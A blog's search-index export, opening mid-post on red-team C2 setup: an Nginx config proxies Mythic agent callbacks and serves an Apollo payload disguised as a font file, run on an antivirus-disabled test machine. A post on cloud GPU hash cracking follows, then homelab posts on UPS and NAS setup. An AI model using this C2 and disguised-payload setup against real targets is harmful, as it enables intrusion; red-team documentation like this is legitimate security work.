rsa:2048 -keyout /etc/ssl/private/nginx-selfsigned.key -out /etc/ssl/certs/nginx-selfsigned.crt sudo openssl dhparam -out /etc/ssl/certs/dhparam.pem 2048 Next, we need to edit the Nginx configuration file on Server 2, where Mythic is running locally, to implement the rules we outlined earlier.\nroot@localhost:/etc/nginx/sites-available# cat mythic.conf server { listen 8443 ssl; # Port that Server 1 forwards to Server 2 server_name \u0026lt;PUBLIC IP OF SERVER 2\u0026gt;; # SSL Self Signed ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt; ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key; ssl_dhparam /etc/ssl/certs/dhparam.pem; # Mythic Agent callback with the random path used in Server 1 location ~ ^/asdasdasdasdasdasdasd1231239asd90asd/?(.*)$ { # Forwards traffic to http profile that resides in Mythic proxy_pass https://127.0.0.1:443$request_uri; proxy_ssl_verify off; proxy_set_header Host 127.0.0.1; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_redirect / /asdasdasdasdasdasdasd1231239asd90asd/; } # Payload host location /assets/fonts/montserrat.ttf { # Direct download of Apollo Agent available in Mythic Web Interface proxy_pass https://127.0.0.1:7443/direct/download/92ca6c6b-f9b2-4ab4-8114-dce0936f3a0c; proxy_ssl_verify off; proxy_set_header Host 127.0.0.1; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_hide_header Content-Disposition; add_header Content-Type \u0026#34;font/ttf\u0026#34;; add_header Content-Disposition \u0026#34;attachment; filename=montserrat.ttf\u0026#34;; } # Catch-all returning 404 location / { return 404; } } Test the configuration syntax:\nsudo nginx -t Create a symlink to enable the configuration:\nsudo ln -s /etc/nginx/sites-available/mythic.conf /etc/nginx/sites-enabled/ Restart the Nginx service:\nsudo systemctl restart nginx Spawning Apollo Now, let’s create the Apollo agent, which interacts with Windows machines.\nIn the Mythic web interface, we create a payload with the following settings:\nAgent -\u0026gt; Apollo C2 Profile -\u0026gt; HTTP Callback Host -\u0026gt; https://api.website.com Callback Port -\u0026gt; 443 Output Format -\u0026gt; Shellcode get_uri -\u0026gt; The path we previously chose in the Nginx configuration post_uri -\u0026gt; Same as the get_uri Headers -\u0026gt; The User-Agent we previously selected in Nginx When configuring Nginx on Server 2, in the line where we use proxy_pass https://127.0.0.1:7443/direct/download/92ca6c6b-f9b2-4ab4-8114-dce0936f3a0c; the long string is the agent\u0026rsquo;s ID.\nYou can find this ID in Mythic by navigating to Payloads -\u0026gt; Actions -\u0026gt; View Payload Configuration\nPoC After completing the setup of the decoy website, configuring both servers along with their Nginx configurations, installing Mythic, and generating the Apollo agent payload, the next step is to deploy the payload on a Windows machine. We transfer the .exe file to the target system and execute it. Upon execution, we observe that the Mythic server receives a callback from the agent, confirming successful communication.\nIt\u0026rsquo;s important to note that during this initial testing phase, the antivirus on the target machine was disabled. This is because, at this point, no obfuscation or evasion techniques have been implemented, so the payload is more likely to be detected by security software. The focus here is on verifying that the infrastructure and communication channels are working correctly before adding additional layers of stealth and evasion in future stages.\nIn this demonstration, the payload is already present on the victim’s machine. However, it’s also possible to access and download the payload directly via https://api.website.com/assets/fonts/montserrat.ttf.\nWith that said, this setup allows for the use of evasion techniques to execute the .ttf file (the Apollo agent) with minimal suspicion, helping to evade defensive measures more effectively.\nReferences https://xbz0n.sh/blog/mythic-c2-early-bird-defender-evasion https://ditrizna.medium.com/design-and-setup-of-c2-traffic-redirectors-ec3c11bd227d https://infosecwriteups.com/mastering-c2-redirectors-a-red-blue-teamers-guide-3e1c6d34ecc8 https://docs.mythic-c2.net/ ", 
        "url": "http:\/\/localhost:1313\/posts\/2025-08-05-frontend-lies-backend-spies\/"
    },
    
    "http:\/\/localhost:1313\/tags\/red-teaming\/": {
        "title": "Red Teaming",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/red-teaming\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2025-07-18-redteaming-ep2e3\/": {
        "title": "Red Teaming EP2 and 3: C2 and Smishing Simulation \u002b C2 and Usb Implant",
        "tags": ["Red Teaming",],
        "content": "These are the final pieces on red team engagements that I wrote during my time at ArtResilia. Here, we cover smishing simulations and USB implants.\nSecond article - In this article, we talk about C2 and Smishing Simulation — the focus is on the execution of a smishing campaign.\nThird article - In this article, we talk about C2 and USB Implant — the focus is on deploying and using a USB implant.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2025-07-18-redteaming-ep2e3\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2025-06-12-hash-cracking-in-the-cloud\/": {
        "title": "Hash Cracking in The Cloud",
        "tags": ["Red Teaming",],
        "content": "Introduction Cracking passwords at scale requires serious GPU power — and serious money. I quickly realized that building a dedicated machine with multiple GPUs wasn\u0026rsquo;t just expensive upfront (thanks to hardware and GPU prices), but also a constant drain due to electricity costs. Worst of all, the rig would sit idle most of the time, wasting its potential. So I started looking for a smarter, more flexible setup. That led me to Hashtopolis, a powerful tool for distributed hash cracking; Vast.ai, a platform offering affordable on-demand GPU instances; and Cloudflare Tunnel, which lets me expose my Hashtopolis server securely to the internet — no public IP or port forwarding needed.\nIn this post, we’ll show you how I integrated all three into a scalable, budget-friendly cracking setup.\nThe Initial Approach: Simple, but risky The first plan was to have the Hashtopolis server running inside a Docker container on a VPS, and then use Vast.ai to spawn GPU-powered instances that run the Hashtopolis Python agent.\nThese agents will connect back to the Hashtopolis server to receive tasks and report results. To enable this connection, we had to expose the Hashtopolis server to the internet - but that brings some security concerns.\nWhy It Fell Short: Security Concerns Our initial setup was simple and functional: we had the Hashtopolis server running inside a Docker container on a VPS, and it was accessible via the VPS’s public IP on port 8080. On the Vast.ai side, we configured it to run Hashtopolis Python agents on demand using this prebuilt Docker image, which includes both Hashcat and the agent. This setup worked like a charm — we could spin up agents on Vast.ai and have them instantly connect to the Hashtopolis server, ready to start cracking.\nHowever, there was one major downside: the Hashtopolis web interface was directly exposed to the internet. Yes, it does have a login form, is password-protected, and even supports multi-factor authentication, but that still left the door partially open. For us, that wasn’t ideal — especially when dealing with a potentially sensitive cracking infrastructure. We wanted an extra layer of protection to hide the service completely from public view unless explicitly accessed through a secure channel.\nThat’s where Cloudflare Tunnel came into play.\nThe Improved Architecture: Securing the Setup Knowing the risks of exposing the Hashtopolis server directly to the internet, we started looking into more secure alternatives — and that’s where Cloudflare Tunnel came in. With Cloudflare Tunnel, we can expose our locally running Hashtopolis (inside a Docker container on the VPS) to the internet without opening any ports or exposing the server’s public IP. Instead, all traffic is routed through Cloudflare’s secure edge network.\nTo add an extra layer of protection, we configured the tunnel to require two custom HTTP headers for any incoming request. This means that even if someone discovers the tunnel URL, they won’t be able to interact with the Hashtopolis server unless they include the correct headers — effectively acting as an API key-style authentication layer before the app’s own login and MFA even come into play. This setup allows only authorized agents to connect to the server securely, giving us the privacy and control we were missing before.\nHands-On: Building the Secure Hashtopolis Cloud Setup This guide does not cover detailed Hashtopolis installation steps. It assumes you already have a running and functional Hashtopolis server ready to go.\nTo put our second - and more secure - plan into action, we needed to go through a few setup steps.\nInstalling Hashtopolis in Docker To install Hashtopolis inside a Docker container, simply follow the official installation guide here: https://github.com/hashtopolis/server/wiki/Installation. Once the server is up and running, be sure to create a voucher through the Hashtopolis web interface - this voucher will later allow your agents to authenticate and register automatically via the Hashtopolis API.\nAlso, don’t forget to keep the Docker container running locally on your VPS, as this is the instance that will be exposed through the Cloudflare Tunnel and serve as the central coordinator for all agent activity.\nThe following is a sample docker-compose.yml file to run the Hashtopolis server locally:\nversion: \u0026#39;3.7\u0026#39; services: hashtopolis-backend: container_name: hashtopolis-backend image: hashtopolis/backend:latest restart: always volumes: - hashtopolis:/usr/local/share/hashtopolis:Z environment: HASHTOPOLIS_DB_USER: $MYSQL_USER HASHTOPOLIS_DB_PASS: $MYSQL_PASSWORD HASHTOPOLIS_DB_HOST: $HASHTOPOLIS_DB_HOST HASHTOPOLIS_DB_DATABASE: $MYSQL_DATABASE HASHTOPOLIS_ADMIN_USER: $HASHTOPOLIS_ADMIN_USER HASHTOPOLIS_ADMIN_PASSWORD: $HASHTOPOLIS_ADMIN_PASSWORD HASHTOPOLIS_APIV2_ENABLE: $HASHTOPOLIS_APIV2_ENABLE depends_on: - db ports: - \u0026#34;127.0.0.1:8080:80\u0026#34; db: container_name: db image: mysql:8.0 restart: always volumes: - db:/var/lib/mysql environment: MYSQL_ROOT_PASSWORD: $MYSQL_ROOT_PASS MYSQL_DATABASE: $MYSQL_DATABASE MYSQL_USER: $MYSQL_USER MYSQL_PASSWORD: $MYSQL_PASSWORD hashtopolis-frontend: container_name: hashtopolis-frontend image: hashtopolis/frontend:latest environment: HASHTOPOLIS_BACKEND_URL: $HASHTOPOLIS_BACKEND_URL restart: always depends_on: - hashtopolis-backend ports: - \u0026#34;127.0.0.1:4200:80\u0026#34; volumes: db: hashtopolis: Configuring a Secure Cloudflare Tunnel First, we need to purchase a domain and add it to our Cloudflare account. This is essential because Cloudflare Tunnel works by associating your tunnel with a domain or subdomain, which will serve as the public endpoint for accessing your Hashtopolis server securely.\nSimply press the \u0026ldquo;Add domain\u0026rdquo; button in the Cloudflare Account Home menu and follow the setup wizard to configure your new domain.\nSecond, we need to configure the Application. To do this, first activate the free Zero Trust plan from the Cloudflare dashboard. Then, navigate to Access \u0026gt; Applications, and add a new Self-Hosted Application.\nNext, type a name for your application, enter your domain, and choose a subdomain — this can be anything you like. The full address (subdomain + domain) will be the URL used to access your Hashtopolis server through the tunnel.\nNext, we set up a service token to use in our access policies. To do this, go to Access \u0026gt; Service Auth in the Cloudflare dashboard. Generate the token and make sure to securely save the two important HTTP headers: CF-Access-Client-Id and CF-Access-Client-Secret. These headers will be required to authenticate any requests sent through the tunnel, ensuring only authorized agents can communicate with the Hashtopolis server.\nAfter that, move to the Policies tab and create a new policy. Give your policy a descriptive name, and set the Action to Service Auth. Then, under Rules, add an Include rule with the selector set to Any Access Service Token. Finally, save the policy. This setup ensures that only requests with valid service tokens can access your Hashtopolis server through the tunnel.\nWith our application set up and the policy applied, it’s time to create the tunnel. To do this, navigate to Networks \u0026gt; Tunnel in the Cloudflare dashboard.\nGive your tunnel a name and follow the installation options provided. In our case, we selected the Debian environment, since we installed the cloudflared binary directly on the VPS where the Hashtopolis Docker container is running.\nNext, go to the Public Hostnames tab and add your subdomain plus domain name. Choose the HTTP service type and set it to forward to localhost on port 8080, which is where your Hashtopolis Docker container is running.\nWith this setup, the Cloudflare Tunnel should be up and running as intended. You can test it by navigating to your subdomain in a browser, where you should see the following:\nSeeing the \u0026ldquo;Forbidden\u0026rdquo; page is exactly what we want - it means our access policy is working. If you modify the request to include the special HTTP headers (CF-Access-Client-Id and CF-Access-Client-Secret), the tunnel authenticates you and lets you reach the Hashtopolis login form. This confirms that only requests with valid service tokens can access the server.\nCustomizing the Hashtopolis Agent for Secure Headers Now that the Cloudflare Tunnel is configured and verified working, we needed to adapt the Hashtopolis Python agent to support custom HTTP headers. This change allows the Vast.ai agents to include the required CF-Access-Client-Id and CF-Access-Client-Secret headers when communicating with our Hashtopolis server through the Cloudflare Tunnel, ensuring secure and authenticated connections.\nTo meet this requirement, I forked the original Hashtopolis Python agent and modified it to support custom HTTP headers. I didn’t want to hardcode the Cloudflare-specific headers (CF-Access-Client-Id and CF-Access-Client-Secret), since other users might use different names or services. Instead, I implemented a command-line argument that allows users to define multiple custom HTTP headers. These headers are then automatically included in all outgoing requests from the agent, ensuring compatibility with secured endpoints like the one behind our Cloudflare Tunnel.\nAs a result, a new version of the Hashtopolis Python agent was created\nPublishing a Custom Docker Image In Vast.ai, we can create instances based on Docker containers. In the initial setup, I used this image, which includes the original Hashtopolis Python agent. However, since I needed support for custom HTTP headers, I decided not to use that version anymore. Instead, I created a new Docker image that uses my modified agent. You can find it here on Docker Hub: https://hub.docker.com/repository/docker/brunoteixeira1996/hashtopolis-hashcat-vast/general. This image is ready to run on Vast.ai and fully supports secure communication with the Hashtopolis server via Cloudflare Tunnel.\nDeploying Scalable Agents on Vast.ai To create a Vast.ai instance using our modified Hashtopolis agent, go to the Templates section and click New. Choose a name for your template, and in the Image Path, enter brunoteixeira1996/hashtopolis-hashcat-vast:latest. Set the Version Tag to latest.\nFor the Launch Mode, select Interactive shell server, SSH, which gives you control over the container once it starts.\nThen, in the On-start script, enter the following to launch the agent with the required HTTP headers and connect it to your Hashtopolis server securely:\ncd htpclient python3 hashtopolis.zip --url https://\u0026lt;YOUR DOMAIN\u0026gt;/api/server.php --voucher \u0026lt;YOUR VOUCHER\u0026gt; --http-headers \u0026#39;CF-Access-Client-Id: REDACTED, CF-Access-Client-Secret: REDACTED\u0026#39; Starting the crack Now that everything is set up, it’s time to start the cracking process.\nThis blog post won’t cover how to upload wordlists or use Hashtopolis in depth, as it assumes you’re already familiar\nFirst, access your Hashtopolis server (you can SSH tunnel your VPS to access it locally via localhost). Then, navigate to Lists \u0026gt; New Hashlist. Here, enter a name for your hashlist, select the appropriate hash type, and upload your hashes.\nNext, head over to Tasks \u0026gt; New Task. Enter a name for your task, select the hashlist you just created, and choose a dictionary (wordlist) of your choice to use for cracking.\nNow, navigate to Vast.ai \u0026gt; Instances and select from your available options. For this example, we’ll choose three RTX 4090 instances to maximize cracking power.\nThe startup and initialization process may take a few minutes—expect to wait at least 5 minutes. After that, check the Instances menu to confirm that all three instances are marked as ready to use.\nNext, go to your Hashtopolis dashboard and navigate to Agents \u0026gt; Show Agents. You should see all three agents listed and waiting to be assigned a task.\nSelect all agents, enable Trust agent with secret data, and assign them to the task you created earlier.\nAfter a few minutes, you should see that the task has successfully completed and all the hashes have been cracked.\nOnce the task is complete, you no longer need the Vast.ai instances. Simply go to the Vast.ai console and manually delete the instances to avoid unnecessary charges.\nAlso don\u0026rsquo;t forget to remove the agents in the Hashtopolis server.\nConclusion In this post, we walked through the evolution of a cost-effective and secure distributed cracking setup using Hashtopolis, Vast.ai, and Cloudflare Tunnel.\nStarting from a simple but insecure public-facing deployment, we improved the architecture by introducing service token-based authentication and custom HTTP headers to lock down access. By adapting the Hashtopolis Python agent and containerizing it for Vast.ai, we achieved a scalable system where agents can be spun up on demand — all while keeping the Hashtopolis server protected behind a Cloudflare Zero Trust tunnel.\nThis approach not only reduces cost by avoiding idle GPU hardware but also improves flexibility and security, making it a solid foundation for similar distributed cracking or compute-heavy workloads.\nThat said, this entire process is currently manual: to start a new cracking job, you need to log into Vast.ai, rent a few instances, then create and assign tasks in Hashtopolis before kicking off the attack. However, this setup can be fully automated. For example, you could build a bot - like a Telegram bot - that receives a hash file, creates the corresponding task in Hashtopolis, provisions Vast.ai instances with predefined parameters, and launches the attack. This is just one example of the powerful automation opportunities enabled by this architecture.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2025-06-12-hash-cracking-in-the-cloud\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2024-10-29-automating-my-ups\/": {
        "title": "Automating My UPS",
        "tags": ["Homelab",],
        "content": "Introduction In an era where every second of downtime can have serious repercussions, maintaining a reliable power supply for your essential devices is crucial. Automating your UPS management not only enhances reliability but also optimizes battery usage during unexpected outages. In this post, we’ll delve into how to automate your UPS using the NUT (Network UPS Tools) framework alongside a custom Go program. This approach not only streamlines power management but also ensures your UPS batteries are used efficiently during limited power situations, safeguarding your equipment when it matters most.\nThe current UPS I am using is a Nilox UPS PREMIUM LINE.\nWhy So, why not dive into this project? Building systems like these is not only enjoyable, but it also allows me to explore a variety of technologies and fields that I\u0026rsquo;m less familiar with, ultimately broadening my knowledge and research horizons. Moreover, commercial UPS systems with automatic shutdown capabilities can be quite costly. By combining an affordable UPS with some programming skills, we can create a smart UPS solution that provides valuable insights into our home’s power usage and ensures a safe shutdown of connected devices, even when I\u0026rsquo;m not around.\nNut To work with the UPS I am using the Nut (Network UPS Tools), running it in a Docker container.\nI first found what was my VENDORID by using docker run --rm --entrypoint /bin/ls instantlinux/nut-upsd /usr/lib/nut\n[nutdev1] driver = \u0026#34;nutdrv_qx\u0026#34; port = \u0026#34;auto\u0026#34; vendorid = \u0026#34;0665\u0026#34; productid = \u0026#34;5161\u0026#34; product = \u0026#34;USB to Serial\u0026#34; vendor = \u0026#34;INNO TECH\u0026#34; bus = \u0026#34;001\u0026#34; With this in mind, I\u0026rsquo;ve followed the README.md from the github repo and configured the Dockerfile as shown below:\nFROM alpine:3.20 MAINTAINER Rich Braun \u0026#34;docker@instantlinux.net\u0026#34; ARG BUILD_DATE ARG VCS_REF LABEL org.label-schema.build-date=$BUILD_DATE \\ org.label-schema.license=GPL-2.0 \\ org.label-schema.name=nut-upsd \\ org.label-schema.vcs-ref=$VCS_REF \\ org.label-schema.vcs-url=https://github.com/instantlinux/docker-tools ARG NUT_VERSION=2.8.2-r0 ENV API_USER=upsmon \\ API_PASSWORD=CHANGETHIS \\ DESCRIPTION=UPS_Brun0x \\ DRIVER=nutdrv_qx \\ GROUP=nut \\ MAXAGE=15 \\ NAME=ups \\ POLLINTERVAL= \\ PORT=auto \\ SDORDER= \\ SECRET=CHANGETHIS \\ SERIAL= \\ SERVER=master \\ USER=nut \\ VENDORID=0665 HEALTHCHECK CMD upsc $NAME@localhost:3493 2\u0026gt;\u0026amp;1|grep -q stale \u0026amp;\u0026amp; \\ kill -SIGTERM -1 || true RUN echo \u0026#39;@edge http://dl-cdn.alpinelinux.org/alpine/edge/community\u0026#39; \\ \u0026gt;\u0026gt;/etc/apk/repositories \u0026amp;\u0026amp; \\ echo \u0026#39;@edgemain http://dl-cdn.alpinelinux.org/alpine/edge/main\u0026#39; \\ \u0026gt;\u0026gt;/etc/apk/repositories \u0026amp;\u0026amp; \\ apk add --no-cache dash@edgemain \u0026amp;\u0026amp; \\ apk add --update --no-cache nut@edge=$NUT_VERSION \\ busybox@edgemain linux-pam@edgemain \\ libcrypto3@edgemain libssl3@edgemain \\ libusb musl net-snmp-libs util-linux RUN apk add --no-cache tzdata ENV TZ=Europe/Lisbon EXPOSE 3493 COPY entrypoint.sh /usr/local/bin/ ENTRYPOINT /usr/local/bin/entrypoint.sh To be able to grab logs from ups I had to edit the entrypoint.sh and add the following line:\n/usr/bin/upslog -u $USER -s ups -i 2 -l /var/log/upslog.txt -f \u0026#34;%TIME @Y-@m-@d @H:@M:@S% %VAR battery.charge% %VAR input.voltage% %VAR ups.load% [%VAR ups.status%]\u0026#34; Then I created a docker-compose.yml as shown below:\nservices: nut-upsd: build: context: . container_name: nut-upsd-new-brun0 environment: - \u0026#34;API_USER=upsmon\u0026#34; - \u0026#34;API_PASSWORD=CHANGETHIS\u0026#34; - \u0026#34;DESCRIPTION=UPS_Brun0x\u0026#34; - \u0026#34;DRIVER=nutdrv_qx\u0026#34; - \u0026#34;GROUP=nut\u0026#34; - \u0026#34;NAME=ups\u0026#34; - \u0026#34;PORT=auto\u0026#34; - \u0026#34;SECRET=CHANGETHIS\u0026#34; - \u0026#34;USER=nut\u0026#34; - \u0026#34;VENDORID=0665\u0026#34; privileged: true restart: always ports: - 3493:3493 volumes: - /home/brun0/nut/nut/upslog.txt:/var/log/upslog.txt After completing these steps, I successfully created the Docker container:\nStarting docker compose up -d --build --force-recreate View logs docker compose logs -f Stoping docker compose down Prometheus Nut exporter To view the UPS logs more effectively, I utilized the Prometheus exporter for NUT with the following docker-compose.yml:\nservices: nut-exporter: # Stable v1 image: hon95/prometheus-nut-exporter:1 environment: - TZ=Europe/Lisbon - HTTP_PATH=/metrics restart: always ports: - \u0026#34;9995:9995/tcp\u0026#34; AlertManager The alerting aspect is crucial, as I want to receive notifications during power outages and keep a record of those alerts. Since I was already using Prometheus for other projects, I decided to implement a new rule in Prometheus Alertmanager to monitor the UPS status and alert me in case of power loss.\nFor this I created a ruled (ups.rules.yml) in /etc/prometheus with the following:\ngroups: - name: ups-alerts rules: - alert: UPSStatusCritical expr: nut_status{ups=\u0026#34;ups\u0026#34;} == 2 for: 3m labels: severity: critical annotations: summary: \u0026#34;UPS status is critical and its running on battery\u0026#34; description: \u0026#34;The UPS status is currently critical (status = 2).\u0026#34; This rule will monitor the NUT Prometheus exporter statistics page and trigger an alert in Prometheus if the nut_status equals 2 (indicating a power loss).\nThen added the rule to the prometheus.yml:\n# Load rules once and periodically evaluate them according to the global \u0026#39;evaluation_interval\u0026#39;. rule_files: - \u0026#34;ups.rules.yml\u0026#34; And finaly configured Alertmanager to make a web call to NutGMonitor (running on 192.168.30.13:9999) whenever a new alert is triggered (explained in the next section):\nroute: group_by: [\u0026#39;ups-alerts\u0026#39;] receiver: \u0026#39;webhook\u0026#39; group_wait: 30s group_interval: 1m repeat_interval: 1m receivers: - name: \u0026#39;webhook\u0026#39; webhook_configs: - url: \u0026#39;http://192.168.30.13:9999/alertmanager\u0026#39; send_resolved: true NutGMonitor Following the initial setup of the UPS, the goal is to continuously monitor its performance and automatically shut down connected devices when needed.\nNutGMonitor is a Go program designed to perform specific actions on the UPS whenever an event occurs.\nWhen the UPS stops receiving power, it triggers a warning to the Prometheus Alert Manager after 2 minutes. The Alert Manager then forwards this information to NutGMonitor.\nIf the power loss continues for approximately 5 minutes, NutGMonitor initiates the shutdown of devices connected to the UPS.\nThe power-off mechanism used in NutGMonitor is customized for the target system. For example, when working with a Linux machine, I create an off bash script containing halt -f -f -p. I then generate an SSH key for connecting from the NutGMonitor instance to the target. To restrict access, I add this key to the target\u0026rsquo;s authorized_keys with the options no-pty,no-X11-forwarding,command=\u0026quot;sudo /root/off\u0026quot;, ensuring it can only execute the off script.\nOnce all targets are powered down, NutGMonitor makes sure to shutdown itself, effectively disconnecting it from the UPS.\nNutGMonitor also accounts for brief power losses followed by quick restorations that can occur before the 2-minute threshold is reached, potentially preventing Alertmanager from receiving updates. To tackle this issue, I monitor these power off/on events using upslog within the NUT Docker container, as shown previously.\nConclusion I\u0026rsquo;ve set up a reliable system that keeps me safe during unexpected power outages (it works for me :)), even when I\u0026rsquo;m away from home. With the integration of a Prometheus exporter, I can monitor my UPS in real-time, allowing me to define new metrics and visualize them whenever I want.\nWhile I can safely shut down all devices when I\u0026rsquo;m at home, I can\u0026rsquo;t always be there when the power goes out. That\u0026rsquo;s where NutGMonitor comes in; it helps me manage and gracefully shut down every device connected to my UPS. This not only eases my mind during outages but also protects my equipment from potential damage caused by abrupt shutdowns. Overall, this setup gives me peace of mind, knowing that I’m prepared for any power interruptions, whether I\u0026rsquo;m home or away.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2024-10-29-automating-my-ups\/"
    },
    
    "http:\/\/localhost:1313\/tags\/homelab\/": {
        "title": "Homelab",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/homelab\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2024-10-08-my-custom-nas\/": {
        "title": "My Custom NAS",
        "tags": ["Homelab",],
        "content": "Introduction In my last post, I began discussing the importance of having a robust and cost-effective backup solution. With data becoming more valuable than ever, finding the right balance between efficiency, reliability, and affordability is crucial. Now, it\u0026rsquo;s time to dive deeper into my thought process and the specific steps I took to build a refined backup system that ticks all these boxes.\nIn this post, I\u0026rsquo;ll walk you through the development of my new backup plan, which includes leveraging a pre-built NAS and affordable hardware to create an efficient, space-conscious solution. I’ll also introduce an upgraded version of the gbackup utility, designed to make backing up and restoring data effortless. Let\u0026rsquo;s get started!\nWhy Before deciding to build my own NAS from individual PC components, I considered purchasing a pre-built NAS from a third-party provider. However, several factors made me reconsider.\nFirst, I didn’t want to be confined to a proprietary environment — I wanted full control to install whatever I needed on my system.\nSecond, most pre-built NAS solutions come with a host of unnecessary features that I simply don’t need, all at a hefty price tag.\nLastly, where\u0026rsquo;s the fun in just buying a box and calling it a day? So, I opted for the DIY route, building and configuring my own NAS from the ground up.\nSo the main goal of the NAS is to:\nBackup everything inside Proxmox Backup my worklatop Backup my two Pi\u0026rsquo;s Be able to backup more stuff in the future NAS Components Inspired by Michael Stapelberg’s blog post.\nType Name Link Case PC SilverStone SG05BB LITE https://www.codi-tek.com/Caixa-Pc-Silverstone-Sg05bb-Lite-Desktop-Housing-Preto-Installation--P335305.html?campanha_track=comparadorgg Motherboard AsRock B450 Gaming ITX/ac https://www.aquario.pt/pt/product/asrock-motherboard-mini-itx-asrock-fatal1ty-b450-90-mxb870-a0uayz?srsltid=AfmBOoppr6E_38Yj8UEVSH9knuz-ow3_4jxVs2yKpyuWN08b1TcgCPKM CPU Cooler Cooler CPU Noctua NH-L12S https://www.pcdiga.com/componentes/coolers-cpu/air-cooling-cpu/cooler-cpu-noctua-nh-l12s-nh-l12s-9010018000054 Power Supply Silverstone ST30SF V2 SFX 300W https://www.pccomponentes.pt/silverstone-st30sf-v2-sfx-300w?srsltid=AfmBOopQ37FC8LHGhw0uuC90dXVXAfWZ-ErGi8MvB8bQvW0NrBwHZ5NU System Disk Intenso NVMe 250 GB https://www.worten.pt/produtos/intenso-ssd-250gb-premium-m-2-pcie-pci-express-3-0-nvme-mrkean-4034303031146 Data Disks 2 SSDs 250 GB Samsung Already had these two Case Fan Noctua NF-S12A ULN https://www.fnac.pt/mp1544968/Noctua-NF-S12A-ULN-Pasta-de-computador-Ventoinha RAM 8GB DDR4 2400 RAM DIMM (1x8GB) CL15 1.2V G.SKILL AEGIS https://chip7.pt/componentes-hardware/memoria-ram/memoria-ram-ddr4/gskill/8gb-ddr4-2400-memoria-ram-dimm-1x8gb-cl15-12v-gskill-aegis-f4-2400c15s?srsltid=AfmBOoqkPL_0bXIdGCiWWybDX4jiGiduBAJU8pndqjOD2OCEX_MdQ32Z CPU AMD Ryzen 3 4300G 8-Core 3.8GHz 4MB Skt AM4 https://www.onbit.pt/processador-amd-ryzen-3-4300g-8-core-3-8ghz-4mb-skt-am4.html It’s worth mentioning that there are a few optional components to consider, such as:\nCPU Cooler Case Fan I chose to invest in these optional components to ensure a longer-lasting and more efficient system. By prioritizing longevity, I can enhance performance and reduce the risk of overheating, ultimately contributing to the overall reliability of my NAS.\nNAS Configuration To configure my NAS, I followed these steps:\nInstalled Debian 12 (No Desktop Environment) I opted for a minimal installation without a Desktop Environment (DE) to keep the system lightweight and focused on performance Set Up Static IP Address To ensure consistent network access, I configured a static IP address by editing the /etc/network/interfaces file Setup Wake on Lan Enter BIOS -\u0026gt; Advanced -\u0026gt; ACPI Configuration -\u0026gt; PCI Devices Power On -\u0026gt; Enable Enter BIOS -\u0026gt; Advanced -\u0026gt; Onboard Devices Configuration -\u0026gt; Restore on AC/Power Loss This setting ensures the machine turns back on after a power loss. Without it, WOL might not work after a power loss Verify if interface has WoL Onboard sudo ethtool \u0026lt;interface\u0026gt; | grep -i wake Test the WoL from another computer in the LAN wakeonlan \u0026lt;mac of NAS\u0026gt; Configure ZFS Install zfs tools Create zfs Pool sudo zpool create -f -o ashift=12 brun0nas1 /dev/disk/by-id/ata-KINGSTON_SA400S37240G_50026B76861689C2 /dev/disk/by-id/ata-KINGSTON_SV300S37A240G_50026B766A04AC5E Create two datasets sudo zfs create brun0nas1/backupExternal \u0026amp;\u0026amp; sudo zfs create brun0nas1/backupProxmox Activate autotrim sudo zpool set autotrim=on brun0nas1 Activate zfs scrub sudo systemctl enable --now zfs-scrub@brun0nas1.timer \\# /etc/systemd/system/zfs-scrub@brun0nas1.timer [Unit] Description=Monthly zpool scrub on brun0nas1 [Timer] OnCalendar=monthly AccuracySec=1h Persistent=true [Service] ExecStart=/usr/bin/zpool scrub brun0nas1 [Install] WantedBy=multi-user.target Configure Proxmox Backup Server (PBS) Install PBS in debian wget https://enterprise.proxmox.com/debian/proxmox-release-bookworm.gpg -O /etc/apt/trusted.gpg.d/proxmox-release-bookworm.gpg \\# added this to /etc/apt/sources.list deb http://download.proxmox.com/debian/pbs bookworm pbs-no-subscription s apt update s apt install proxmox-backup-server Configure mount point (backupExternal was optional here, I added but it is not used in PBS) mkdir -p /mnt/datastore/backupExternal mkdir -p /mnt/datastore/backupProxmox s zfs set mountpoint=/mnt/datastore/backupProxmox brun0nas1/backupProxmox s zfs set mountpoint=/mnt/datastore/backupProxmox brun0nas1/backupExternal Verify mount point zfs list NAME USED AVAIL REFER MOUNTPOINT brun0nas1 1.02M 430G 96K /brun0nas1 brun0nas1/backupExternal 96K 430G 96K /mnt/datastore/backupExternal brun0nas1/backupProxmox 96K 430G 96K /mnt/datastore/backupProxmox Add mount points into PBS Datastore Add PBS to Proxmox Go to Proxmox and Datacenter -\u0026gt; Storage -\u0026gt; Add Proxmox Backup Server The Fingerprint needs to be from PBS so go to Dashboard and chose Show Fingerprint Create the backup format I choosed to perform one backup every friday at 13 and keep the last 2 Gbackupv2 Backup Information External Hard Drive Setup The external hard drive, mounted at /mnt/external, is plugged into Proxmox. Proxmox shares this drive across the local network using Samba, making it accessible to other devices. Gbackup Configuration Gbackup, running on pinute (a Raspberry Pi dedicated to this task), has SSH access to the NAS and can also access the /mnt/external Samba share. Backup workflow Scheduled Incremental Backup (Every Friday at 1 PM) The following steps outline how the incremental backup process occurs each Friday:\n12:50 PM: Gbackup sends a Wake-on-LAN (WoL) signal to power on the NAS 1:00 PM: Proxmox Backup Server (PBS) performs an incremental backup of Proxmox virtual machines (VMs) and containers, saving the data to /backupProxmox Gbackup uses the Proxmox API to check the status and results of the Proxmox backups for the current day After PBS Backup Completion: Gbackup backs up important directories from gokrazy, worklatop, pinute, ... These are backed up to the external hard drive mounted at /mnt/external Mirror Backup to NAS: Gbackup then copies the contents of /mnt/external (which includes the aforementioned directories) to the NAS under /backupExternal Shutdown NAS: Once the backup process is complete, Gbackup powers off the NAS to conserve energy Final backup structure External Drive (/mnt/external) contains backups of:\nGokrazy perm partition Work laptop files 